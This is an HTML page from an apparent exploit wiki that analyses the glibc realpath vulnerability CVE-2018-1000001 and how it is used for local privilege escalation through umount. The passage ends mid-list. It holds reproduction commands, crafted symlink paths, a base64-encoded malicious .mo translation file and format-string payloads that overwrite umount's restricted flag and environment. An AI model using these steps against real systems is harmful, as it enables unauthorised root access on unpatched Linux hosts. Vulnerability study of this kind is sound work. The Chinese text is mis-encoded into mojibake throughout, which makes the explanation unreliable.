<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <link rel="shortcut icon" href="../img/favicon.ico">
  <title>Cve 2018 1000001 - expwiki</title>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="../css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../css/theme_extra.css" type="text/css" />
  <link rel="stylesheet" href="../css/highlight.css">
  
  <script>
    // Current page data
    var mkdocs_page_name = "Cve 2018 1000001";
    var mkdocs_page_input_path = "cve-2018-1000001.md";
    var mkdocs_page_url = "/cve-2018-1000001/";
  </script>
  
  <script src="../js/jquery-2.1.1.min.js"></script>
  <script src="../js/modernizr-2.8.3.min.js"></script>
  <script type="text/javascript" src="../js/highlight.pack.js"></script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
      <div class="wy-side-nav-search">
        <a href=".." class="icon icon-home"> expwiki</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
	<ul class="current">
	  
          
            <li class="toctree-l1">
		
    <a class="" href="..">Home</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../acknowledgements/">Acknowledgements</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../cve-2018-1000001-01/">Cve 2018 1000001 01</a>
	    </li>
          
            <li class="toctree-l1 current">
		
    <a class="current" href="./">Cve 2018 1000001</a>
    <ul class="subnav">
            
    <li class="toctree-l2"><a href="#cve-2018-1000001">cve-2018-1000001</a></li>
    
        <ul>
        
            <li><a class="toctree-l3" href="#0">0.ä½œè€…</a></li>
        
            <li><a class="toctree-l3" href="#1">1.èƒŒæ™¯ä»‹ç»</a></li>
        
            <li><a class="toctree-l3" href="#2">2.æ¼æ´åˆ†æ</a></li>
        
            <li><a class="toctree-l3" href="#3poc">3.POC</a></li>
        
        </ul>
    

    <li class="toctree-l2"><a href="#1_1">1. å»ä¸Šé¢ğŸ‘†ç»™å‡ºçš„åœ°å€å¤„ä¸‹è½½é•œåƒ</a></li>
    

    <li class="toctree-l2"><a href="#2_1">2. åˆ›å»ºè™šæ‹Ÿæœºç¡¬ç›˜</a></li>
    

    <li class="toctree-l2"><a href="#3-enable-kvm">3. å®‰è£…è™šæ‹Ÿæœº(æœ‰æ¡ä»¶å¯ä»¥å¢åŠ -enable-kvmé€‰é¡¹)</a></li>
    

    <li class="toctree-l2"><a href="#_1">åˆ¤æ–­æ–¹æ³•ï¼š</a></li>
    

    <li class="toctree-l2"><a href="#grep-e-vmxsvm-proccpuinfo">grep -E 'vmx|svm' /proc/cpuinfo</a></li>
    

    <li class="toctree-l2"><a href="#lsmod-grep-kvm">lsmod | grep kvm</a></li>
    

    <li class="toctree-l2"><a href="#4">4. å¯åŠ¨è™šæ‹Ÿæœº</a></li>
    

    <li class="toctree-l2"><a href="#5-gcc">5. å¯åŠ¨åå®‰è£…GCC</a></li>
    
        <ul>
        
            <li><a class="toctree-l3" href="#4exp">4.EXP</a></li>
        
            <li><a class="toctree-l3" href="#5">5.é˜²æŠ¤å»ºè®®</a></li>
        
            <li><a class="toctree-l3" href="#6">6.å‚è€ƒ</a></li>
        
        </ul>
    

    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../cve-2019-12735-01/">Cve 2019 12735 01</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../cve-2019-12735/">Cve 2019 12735</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../lynisåˆ†æ/">Lynisåˆ†æ</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../vulsåˆ†æ/">Vulsåˆ†æ</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../wazuhåˆ†æ/">Wazuhåˆ†æ</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../wazuhæ€§èƒ½åˆ†æ/">Wazuhæ€§èƒ½åˆ†æ</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../æ¼æ´åˆ©ç”¨çŸ¥è¯†åº“æ¨¡ç‰ˆ/">æ¼æ´åˆ©ç”¨çŸ¥è¯†åº“æ¨¡ç‰ˆ</a>
	    </li>
          
        </ul>
      </div>
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="..">expwiki</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="..">Docs</a> &raquo;</li>
    
      
    
    <li>Cve 2018 1000001</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="cve-2018-1000001">cve-2018-1000001</h1>
<h3 id="0">0.ä½œè€…</h3>
<p>invincible1944@gmail.com</p>
<h3 id="1">1.èƒŒæ™¯ä»‹ç»</h3>
<ul>
<li>æ¼æ´ç›¸å…³è½¯ä»¶</li>
</ul>
<p>glibc &lt;= 2.26</p>
<ul>
<li>
<p>GLibcç®€ä»‹</p>
</li>
<li>
<p>GNU/Linux systemsç­‰ä½¿ç”¨Linuxå†…æ ¸ç³»ç»Ÿçš„æ ¸å¿ƒCä»£ç åº“</p>
</li>
<li>
<p>è¿™äº›ä»£ç åº“æä¾›ä¸¥æ ¼éµå¾ªISO C11, POSIX.1-2008, BSDç­‰æ ‡å‡†çš„API</p>
</li>
<li>
<p>è¿™äº›APIåŒ…å« open, read, write, malloc, printfç­‰åŸºæœ¬å‡½æ•°</p>
</li>
<li>
<p><a href="https://www.gnu.org/software/libc/libc.html">å‚è€ƒä¸€(GLIBC å®˜ç½‘)</a>, <a href="http://man7.org/linux/man-pages/man7/libc.7.html">å‚è€ƒäºŒ(Linux manual)</a></p>
</li>
<li>
<p>æ¼æ´å±å®³</p>
</li>
</ul>
<p>å¯¹æœªå®‰è£…è¡¥ä¸çš„Linuxç³»ç»Ÿè¿›è¡Œæœ¬åœ°ææƒã€‚</p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000001">Known Affected Software Configurations</a></p>
<ul>
<li>å…¶ä»–å¯¹äº†è§£æ¼æ´æœ‰åˆ©çš„èƒŒæ™¯çŸ¥è¯†</li>
</ul>
<p><a href="http://man7.org/linux/man-pages/man7/namespaces.7.html">namespaces</a>  </p>
<p><a href="http://man7.org/linux/man-pages/man7/user_namespaces.7.html">user_namespaces</a> </p>
<p><a href="http://man7.org/linux/man-pages/man7/mount_namespaces.7.html">mount_namespaces</a></p>
<p><a href="http://man7.org/linux/man-pages/man3/setlocale.3.html">setlocale - set the current locale</a></p>
<p><a href="https://zh.wikipedia.org/wiki/Gettext">Gettext</a></p>
<p><a href="https://zh.wikipedia.org/wiki/æ ¼å¼åŒ–å­—ç¬¦ä¸²">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a></p>
<h3 id="2">2.æ¼æ´åˆ†æ</h3>
<ul>
<li>æ¼æ´åŸç†</li>
</ul>
<p>ç¼“å†²åŒºè¾¹ç•Œåˆ¤æ–­ä¸ä¸¥æ ¼é€ æˆè¶Šç•Œå†™ã€‚</p>
<ul>
<li>æ¼æ´æ‰€å±è½¯ä»¶é“¾æ¥ï¼Œç‰ˆæœ¬ï¼Œæ¨¡å—ï¼Œç›®å½•ï¼Œæ–‡ä»¶ï¼Œä»£ç è¡Œ</li>
</ul>
<p>æ¼æ´è½¯ä»¶ç‰ˆæœ¬ï¼šglibc &lt;= 2.26</p>
<p>æ¼æ´ä»£ç ä½ç½®ï¼š<code>glibc-2.26/stdlib/canonicalize.c -&gt; __realpath( line 122, 199 )</code></p>
<p><a href="https://www.gnu.org/software/libc/libc.html">GLibc å®˜ç½‘</a><a href="http://ftp.gnu.org/gnu/glibc/">GLibc æºç åº“</a></p>
<ul>
<li>æ¼æ´æ‰€å±ç±»å‹</li>
</ul>
<p><a href="https://cwe.mitre.org/data/definitions/787.html">CWE-787: Out-of-bounds Write</a></p>
<ul>
<li>æ¼æ´è¡¥ä¸</li>
</ul>
<p><a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=fabef2edbc29424a8048bdd60eba1a201f95682b">glibc upstream</a></p>
<ul>
<li>æ¼æ´CVEå·</li>
</ul>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000001">CVE-2018-1000001 </a></p>
<h3 id="3poc">3.POC</h3>
<h4 id="apoc">a.POCåŸç†</h4>
<ul>
<li>
<p>æ„é€ ç‰¹æ®Šçš„namespaceè¿›ç¨‹(ä¸‹æ–‡ç§°ns_proc)ï¼Œå¹¶åœ¨è¿›ç¨‹çš„å·¥ä½œç›®å½•ä¸‹æ„å»ºç‰¹æ®Šçš„ç›®å½•ç»“æ„ï¼ŒåŒ…å«ç‰¹åˆ¶çš„ç¬¦å·é“¾æ¥ï¼Œå’Œç‰¹åˆ¶çš„NLSæ–‡ä»¶</p>
</li>
<li>
<p>ä½¿umountåœ¨ns_procè¿›ç¨‹çš„å·¥ä½œç›®å½•ä¸‹è¿è¡Œï¼Œå¸è½½ç‰¹åˆ¶çš„ç¬¦å·é“¾æ¥è§¦å‘è¶Šç•Œå†™ï¼Œè¦†ç›–setloacleéœ€è¦åŠ è½½çš„æ­£å¸¸æ–‡ä»¶è·¯å¾„ï¼Œè¿«ä½¿å…¶ä½¿ç”¨ç›¸å¯¹è·¯å¾„åŠ è½½ç‰¹åˆ¶çš„ NLSæ–‡ä»¶</p>
</li>
<li>
<p>ç‰¹åˆ¶NLSæ–‡ä»¶èƒ½å¤Ÿæ§åˆ¶umountçš„errorä¿¡æ¯çš„æ ¼å¼ï¼Œå¯ä»¥åˆ©ç”¨%nè·å–å†™å…¥æ ˆå†…å­˜çš„èƒ½åŠ›ï¼Œè€Œåˆšå¥½èƒ½å¤Ÿä¿®æ”¹umount libmnt_contextç»“æ„ä½“çš„restrictedæ ‡å¿—ä½ï¼Œä½¿umountè®¤ä¸ºè°ƒç”¨è€…ä¸ºrootæƒé™ï¼Œè¿›è€Œå…è®¸åç»­çš„umout / æ“ä½œï¼Œä»è€Œå®ç°DOS</p>
</li>
</ul>
<h4 id="bpoc">b.POCæºç </h4>
<p>è§é™„ä»¶: cve-2018-1000001-01.md</p>
<h4 id="c">c.å¤ç°æ­¥éª¤</h4>
<ul>
<li>
<p>å¤ç°ç¯å¢ƒ</p>
</li>
<li>
<p>ç¯å¢ƒä¿¡æ¯</p>
<ul>
<li>ç³»ç»Ÿç‰ˆæœ¬: Linux debian 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux</li>
<li>å‘è¡Œç‰ˆåç§°: Debian GNU/Linux 9 (stretch)</li>
<li>glibcç‰ˆæœ¬:  Debian GLIBC 2.24-11+deb9u4</li>
<li>gccç‰ˆæœ¬:  gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516</li>
<li>umountç‰ˆæœ¬: umount from util-linux 2.29.2 </li>
<li>é•œåƒä¸‹è½½åœ°å€ï¼š<a href="https://cdimage.debian.org/mirror/cdimage/archive/9.12.0/amd64/iso-dvd/debian-9.12.0-amd64-DVD-1.iso">debian-9.12.0-amd64-DVD-1.iso</a></li>
<li>è™šæ‹Ÿæœºè½¯ä»¶ï¼šVMwareFusion ä¸“ä¸šç‰ˆ 11.5.1 (15018442)</li>
<li>è™šæ‹Ÿæœºè½¯ä»¶ï¼šQEMU emulator version 4.2.0</li>
</ul>
</li>
<li>
<p>QEMUè™šæ‹Ÿæœºæ­å»ºæ­¥éª¤</p>
<p>```shell</p>
<h1 id="1_1">1. å»ä¸Šé¢ğŸ‘†ç»™å‡ºçš„åœ°å€å¤„ä¸‹è½½é•œåƒ</h1>
<h1 id="2_1">2. åˆ›å»ºè™šæ‹Ÿæœºç¡¬ç›˜</h1>
<p>$ qemu-img create -f qcow2 debian9.img 10G</p>
<h1 id="3-enable-kvm">3. å®‰è£…è™šæ‹Ÿæœº(æœ‰æ¡ä»¶å¯ä»¥å¢åŠ -enable-kvmé€‰é¡¹)</h1>
<h1 id="_1">åˆ¤æ–­æ–¹æ³•ï¼š</h1>
<h1 id="grep-e-vmxsvm-proccpuinfo">grep -E 'vmx|svm' /proc/cpuinfo</h1>
<h1 id="lsmod-grep-kvm">lsmod | grep kvm</h1>
<p>$ qemu-system-x86_64  -m 2048 -hda debian9.img  -cdrom ./debian-9.12.0-amd64-DVD-1.iso</p>
<h1 id="4">4. å¯åŠ¨è™šæ‹Ÿæœº</h1>
<p>$ qemu-system-x86_64 -m 2048  debian9.img</p>
<h1 id="5-gcc">5. å¯åŠ¨åå®‰è£…GCC</h1>
<p>$ su
$ apt install gcc</p>
<p>```</p>
<ul>
<li>æ­¥éª¤ä¸€ è®¾ç½®unprivileged_userns_cloneæƒé™</li>
</ul>
<p><code>shell
 # å°†unprivileged_userns_cloneè®¾ç½®ä¸º1(é»˜è®¤ä¸º0)
 root$ echo 1 &gt; /proc/sys/kernel/unprivileged_userns_clone</code></p>
<ul>
<li>
<p>æ­¥éª¤äºŒ åˆ›å»ºå…·æœ‰ç‹¬ç«‹ user/mount namespaceçš„è¿›ç¨‹(ä¸‹æ–‡ç§°us_proc)</p>
</li>
<li>
<p>å…¶ä»–è¿›ç¨‹è¿›å…¥us_procè¿›ç¨‹çš„"/proc/[us_proc pid]/cwd"ç›®å½•åï¼Œç”¨realpath(getcwd)è·å–çš„ç›¸å¯¹ç›®å½•å‡åŒ…å«"(unreachable)/tmp/"å‰ç¼€</p>
</li>
</ul>
<p>```shell
  /usr/bin/unshare -m -U --map-root-user /bin/bash
  mount -t tmpfs tmpfs /tmp
  cd /tmp
  chmod 00755 .</p>
<p># Terminal 1
  debian@debian:~/Desktop/work$ /usr/bin/unshare -m -U --map-root-user /bin/bash
  root@debian:~/Desktop/work# mount -t tmpfs tmpfs /tmp
  root@debian:~/Desktop/work# cd /tmp
  root@debian:/tmp# chmod 00755 .
  root@debian:/tmp# echo $$
  52426
  root@debian:/tmp# </p>
<p># æ•ˆæœå¦‚ä¸‹
  # Terminal 2
  $ cd /proc/52426/cwd
  debian@debian:/proc/52426/cwd$ 
  debian@debian:/proc/52426/cwd$ realpath .
  (unreachable)/tmp
  debian@debian:/proc/52426/cwd$ realpath ../x
  (unreachable)/x
  debian@debian:/proc/52426/cwd</p>
<p>```</p>
<ul>
<li>
<p>æ­¥éª¤ä¸‰ åˆ›å»ºæ¼æ´åˆ©ç”¨éœ€è¦çš„ç›®å½•å’Œæ–‡ä»¶</p>
</li>
<li>
<p><code>__gconv_find_shlib/C/LC_MESSAGES</code>ç›®å½•æ˜¯setloacaleå¯»æ‰¾moæ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„
    ç‰¹åˆ«æ³¨æ„çš„ä¸€ç‚¹ï¼š<code>__gconv_find_shlib</code> åœ¨ä¸åŒç³»ç»Ÿä¸Šä¸ä¸€æ ·ï¼Œåœ¨æ¼æ´ä½œè€…çš„expä¸­è¿˜ç»™å‡ºäº†ä¸¤ä¸ªç›®å½•(<code>from_archive, _nl_load_locale_from_archive</code>) </p>
</li>
<li>"(unreachable)/x" æ˜¯realpathè§£æç¬¦å·é“¾æ¥çš„è¿”å›å€¼å¯¹åº”çš„ç›®å½•</li>
<li>util-linux.moæ–‡ä»¶ç”¨äºä¿å­˜ç‰¹åˆ¶çš„libcä¾èµ–çš„.moç¿»è¯‘æ–‡ä»¶</li>
<li>ç¬¦å·é“¾æ¥ç”¨äºè§¦å‘è¶Šç•Œå†™æ¼æ´</li>
<li>util-linux.moä¿å­˜äº†è§¦å‘DOSçš„ç‰¹åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²"AA%6$lnlnAAAAAAAAAA"</li>
</ul>
<p>```shell
  mkdir -p -- "(unreachable)/tmp" "(unreachable)/tmp/<strong>gconv_find_shlib/C/LC_MESSAGES" "(unreachable)/x"
  ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A "(unreachable)/tmp/down"
  base64 -d &lt;<B64-EOF | bzip2 -cd > "(unreachable)/tmp/</strong>gconv_find_shlib/C/LC_MESSAGES/util-linux.mo"
  QlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG
  mQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv
  iG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL
  5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=
  B64-EOF</p>
<p>root@debian:/tmp# tree
  .
  â””â”€â”€ (unreachable)
      â”œâ”€â”€ tmp
      â”‚   â”œâ”€â”€ down -&gt; ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A
      â”‚   â””â”€â”€ __gconv_find_shlib
      â”‚       â””â”€â”€ C
      â”‚           â””â”€â”€ LC_MESSAGES
      â”‚               â””â”€â”€ util-linux.mo
      â””â”€â”€ x</p>
<p>root@debian:/tmp# strings "(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo"
  %s: not mounted
  Language: en
  MIME-Version: 1.0
  Content-Type: text/plain; charset=UTF-8
  Content-Transfer-Encoding: 8bit
  AA%6$lnlnAAAAAAAAAA</p>
<p>```</p>
<ul>
<li>
<p>æ­¥éª¤å›› é€šè¿‡umountè§¦å‘DOS</p>
</li>
<li>
<p>LC_ALLç¯å¢ƒå˜é‡ä¼šä½¿setlocaleå‡½æ•°å»åŠ è½½ç¿»è¯‘æ–‡ä»¶</p>
</li>
<li>
<p>umountä¼šå…ˆå°è¯•å¸è½½downç›®å½•ï¼Œè¿™ä¸ªç‰¹åˆ¶çš„ç¬¦å·é“¾æ¥ä¼šè§¦å‘realpathæ¼æ´é€ æˆè¶Šç•Œå†™ï¼Œå°†å †å†…å­˜ä¸­çš„<code>"/usr/lib/locale/C.utf8/LC_CTYPE"</code>è·¯å¾„å­—ç¬¦ä¸²ä¸­LC_CTYPEè¦†ç›–ä¸ºAAAAAA(ç•¥...)/A</p>
</li>
<li>
<p>å½“realpathå°†downè§£æä¸º(unreachable)/xåï¼Œumountä¼šè°ƒç”¨warnxå‡½æ•°æ‰“å°è­¦å‘Šä¿¡æ¯ï¼Œæ­¤æ—¶ä¼šåŠ è½½ç‰¹åˆ¶çš„util-linux.moæ–‡ä»¶ï¼Œ<code>"AA%6$lnlnAAAAAAAAAA"</code>æ›¿æ¢æ‰warnxå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°<code>"%s: not mounted"</code></p>
</li>
<li>
<p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œumountæ ˆä¸­RSPå­˜æ”¾çš„åœ°å€å¤„çš„æŒ‡é’ˆæŒ‡å‘çš„<code>long intå€¼(*(long *)$RSP)</code>ä¼šè¢«ä¿®æ”¹ä¸º2ã€‚è¿™ä¼šå°†è¯¥å¤„å­˜æ”¾çš„libmnt_contextç»“æ„ä½“çš„restrictedå­—æ®µä¿®æ”¹ä¸º0, ä»è€Œè®©umountè®¤ä¸ºè°ƒç”¨è€…æ˜¯rootç”¨æˆ·ï¼Œå¹¶æˆåŠŸè¿›è¡Œåé¢çš„umount / æ“ä½œã€‚</p>
<p>è¿™ä¸ªæ­¥éª¤ç›¸å…³çš„umountè°ƒç”¨æ ˆ:</p>
<p><code>main-&gt;umount_one-&gt;make_exit_code-&gt;warnx(_("%s: not mounted"), tgt);</code></p>
<p>( <a href="https://zh.wikipedia.org/wiki/æ ¼å¼åŒ–å­—ç¬¦ä¸²">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a> , <a href="https://shimo.im/docs/g6CxTdpcQ8wcHkKc/">x64ä¼ å‚é¡ºåº</a> )</p>
</li>
</ul>
<p><code>shell
  test$ cd /proc/2299/cwd
  test$ LC_ALL=C.UTF-8 /bin/umount --lazy down /
  AAlnAAAAAAAAAA</code></p>
</li>
</ul>
<h3 id="4exp">4.EXP</h3>
<h4 id="aexp">a.EXPåŸç†</h4>
<p><strong>å‡†å¤‡é˜¶æ®µ(prepareNamespacedProcess)</strong></p>
<ul>
<li>å…ˆé€šè¿‡cloneå¯åŠ¨ä¸€ä¸ªæ‹¥æœ‰ç‹¬ç«‹user/mount namespaceçš„å­è¿›ç¨‹
  å­è¿›ç¨‹å¯åŠ¨åï¼Œä¼šå…ˆç­‰å¾…çˆ¶è¿›ç¨‹å°†å…¶uidå’Œgidè®¾ç½®ä¸º0(å½“å‰namespace)
  ç„¶åmount tmpfsåˆ°/tmpç›®å½•ï¼Œå¹¶åˆ‡æ¢åˆ°/tmpä½œä¸ºå½“å‰å·¥ä½œç›®å½•
  åˆ›å»ºä¸€ä¸ªreadyæ–‡ä»¶(O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY)</li>
<li>
<p>è·å–å½“å‰ç³»ç»Ÿä¿¡æ¯</p>
</li>
<li>
<p>åœ¨cloneå‡ºçš„å­è¿›ç¨‹å·¥ä½œç›®å½•(/proc/[pid]/cwd)ä¸­ç”Ÿæˆä¸€ç³»åˆ—æ–‡ä»¶å’Œç›®å½•</p>
</li>
</ul>
<p>ç”Ÿæˆçš„æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<pre><code class="shell">invincible@ubuntu:/proc/10013/cwd$ tree
.
â”œâ”€â”€ DATEMSK
â”œâ”€â”€ ready
â””â”€â”€ (unreachable)
    â”œâ”€â”€ tmp
    â”‚   â”œâ”€â”€ down -&gt; ../x/../../AAA(çœç•¥...)A/AAA(çœç•¥...)A/A
    â”‚   â””â”€â”€ from_archive
    â”‚       â”œâ”€â”€ C.UTF-8
    â”‚       â”‚   â””â”€â”€ LC_MESSAGES
    â”‚       â”‚       â””â”€â”€ util-linux.mo
    â”‚       â”œâ”€â”€ X.x
    â”‚       â”‚   â””â”€â”€ LC_MESSAGES
    â”‚       â””â”€â”€ X.X
    â”‚           â””â”€â”€ LC_MESSAGES
    â”‚               â””â”€â”€ util-linux.mo
    â””â”€â”€ x


10 directories, 5 files 
invincible@ubuntu:/proc/10013/cwd$ cat DATEMSK 
#!/home/invincible/Desktop/test/exp
unused
invincible@ubuntu:/proc/10013/cwd$ file DATEMSK 
DATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executable

invincible@ubuntu:/proc/10013/cwd$ 
invincible@ubuntu:/proc/10013/cwd$ file ready 
ready: empty


invincible@ubuntu:/proc/10013/cwd$ file \(unreachable\)/tmp/from_archive/C.UTF-8/LC_MESSAGES/util-linux.mo 
(çœç•¥...)/util-linux.mo: GNU message catalog (little endian), revision 0.0, 4 messages


invincible@ubuntu:/proc/10013/cwd$ file \(unreachable\)/tmp/from_archive/X.X/LC_MESSAGES/util-linux.mo 
(çœç•¥...)/util-linux.mo: fifo (named pipe)

</code></pre>

<p>æ„é€ çš„DATEMSKæ–‡ä»¶å†…å®¹ä¸º/proc/self/exeç¬¦å·é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶:</p>
<pre><code class="shell">invincible@ubuntu:/proc/10013/cwd$ cat DATEMSK 
#!/home/invincible/Desktop/test/exp
unused
invincible@ubuntu:/proc/10013/cwd$ file DATEMSK 
DATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executabl

</code></pre>

<p>æ„é€ ç‰¹åˆ¶çš„util-linux.moæ–‡ä»¶å†…å®¹:</p>
<pre><code class="shell">invincible@ubuntu:~/Desktop/test$ msgunfmt util-linux.mo -o util-linux.po
invincible@ubuntu:~/Desktop/test$ cat util-linux.po 
msgid &quot;&quot;
msgstr &quot;&quot;
&quot;Language: en\n&quot;
&quot;MIME-Version: 1.0\n&quot;
&quot;Content-Type: text/plain; charset=UTF-8\n&quot;
&quot;Content-Transfer-Encoding: 8bit\n&quot;


msgid &quot;%s: mountpoint not found&quot;
msgstr &quot;1234&quot;


msgid &quot;%s: not mounted&quot;
msgstr &quot;&quot;
&quot;AA%6$lnAAAAAA%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx&quot;
(çœç•¥... å…±256ä¸ª%16lx)
&quot;%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx&quot;
&quot;%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%1$68hhx%256$hhn&quot;


msgid &quot;&quot;
&quot;%s: target is busy\n&quot;
&quot;        (In some cases useful info about processes that\n&quot;
&quot;         use the device is found by lsof(8) or fuser(1).)&quot;
msgstr &quot;5678&quot;
invincible@ubuntu:~/Desktop/test$ 

</code></pre>

<p><strong>ææƒé˜¶æ®µ(attemptEscalation)</strong></p>
<ul>
<li>
<p>å‡†å¤‡å·¥ä½œ</p>
</li>
<li>
<p>åˆ›å»ºç”¨äºå’Œå­è¿›ç¨‹é€šä¿¡çš„pipeç”¨äºè¯»å–å­è¿›ç¨‹stdoutå’Œstderr</p>
</li>
<li>
<p>forkå‡ºå­è¿›ç¨‹(ä¸‹æ–‡ç§°umoutè¿›ç¨‹)ï¼Œåœ¨å­è¿›ç¨‹ä¸­è®¾ç½®pipeï¼Œåˆ‡æ¢åˆ°us_procè¿›ç¨‹çš„å·¥ä½œç›®å½•ï¼Œexecveæ‰§è¡Œumountï¼Œå…·ä½“æ‰§è¡Œå‘½ä»¤ï¼š</p>
<p>```shell
AANGUAGE=X.X AANGUAGE=X.X (çœç•¥...å…±255æ¬¡) LC_ALL=C.UTF-8 /bin/umount  /run /run /run /run /run /run /run /run /run /run down LABEL=78 LABEL=789 LABEL=789a LABEL=789ab LABEL=789abc LABEL=789abcd LABEL=789abcde LABEL=789abcdef LABEL=789abcdef0 LABEL=789abcdef0</p>
<p>```</p>
</li>
<li>
<p>å¼€å§‹ææƒ</p>
</li>
<li>
<p>ç¬¬0æ­¥ï¼Œçˆ¶è¿›ç¨‹å¼€å§‹æŒç»­è¯»å–umountè¿›ç¨‹çš„è¾“å‡ºï¼Œç­‰å¾…"AAAAAAAA"å­—ç¬¦ä¸²çš„å‡ºç°</p>
</li>
<li>ç¬¬1æ­¥ï¼Œè¯»å–å®Œæ•´çš„æ ˆå†…å­˜æ•°æ®ï¼Œå¹¶å¼€å§‹è§£æï¼Œæ„é€ ç¬¬äºŒé˜¶æ®µçš„util-linx.moæ–‡ä»¶å†…å®¹å¹¶å†™å…¥</li>
<li>ç¬¬2æ­¥ï¼ŒæŒç»­ç­‰å¾…ï¼Œç›´åˆ°åœ¨è¶…æ—¶æ—¶é—´å†…ï¼Œç¬¬äºŒé˜¶æ®µutil-linux.moæ–‡ä»¶å†…å®¹è¢«umountè¯»å–</li>
<li>ç¬¬3æ­¥ï¼Œè¯»å–å‰©ä¸‹çš„umountè¾“å‡ºé˜²æ­¢å…¶è¢«é˜»å¡</li>
<li>umountå¯åŠ¨åï¼Œè§£æç¬¦å·é“¾æ¥downä¼šè§¦å‘è¶Šç•Œå†™ï¼Œä½¿å †å†…å­˜ä¸­å­˜æ”¾çš„æ­£å¸¸æ–‡ä»¶è·¯å¾„å¤±æ•ˆï¼Œè¿«ä½¿å…¶åŠ è½½ä½äºç›¸å¯¹ç›®å½•C.UTF-8/LC_MESSAGES/ä¸­ç‰¹åˆ¶çš„util-linux.moæ–‡ä»¶ï¼Œå…¶ä¸­çš„ poisonous format string ä¼šå°†æ ˆå†…å­˜dumpåˆ°stderrï¼ŒåŒæ—¶è¿˜ä¼šé€šè¿‡æŒ‡å‘ç¯å¢ƒå˜é‡çš„æŒ‡é’ˆï¼Œå°†"AANGUAGE=X.X"ä¿®æ”¹ä¸º"LANGUAGE=X.X"</li>
<li>umountç»§ç»­æ‰§è¡Œï¼Œç”±äºç¯å¢ƒå˜é‡è¢«ä¿®æ”¹ï¼Œè¿™å°†ä½¿umountè¯»å–ç¬¬äºŒé˜¶æ®µçš„util-linux.moæ–‡ä»¶(ä½äºX.X/LC_MESSAGESç›®å½•ä¸‹ï¼Œç”±äºè¯¥æ–‡ä»¶ä¸ºfifo named pipeï¼Œæ‰€ä»¥è¿™é‡Œumounä¼šé˜»å¡ç­‰å¾…å…¶è¢«å†™å…¥æ•°æ®)</li>
<li>
